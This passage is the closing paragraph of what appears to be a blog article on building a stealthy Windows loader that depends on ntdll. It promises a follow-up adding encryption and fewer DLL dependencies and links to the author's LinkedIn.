    Stay tuned for the next article, where we aim to make the loader even more independent by incorporating encryption and other modifications. Additionally, we will attempt to remove dependencies on certain libraries other than ntdll that we have covered here, and minimize reliance on other DLLs that the stealth loader currently depends on.

    I highly encourage you to dig deep and see the differences between the current loader and the upcoming versions. When you're ready for the next release, feel free to connect with me on [LinkedIn](https://www.linkedin.com/in/a-abbass-ote-257535215/) for updates and discussions.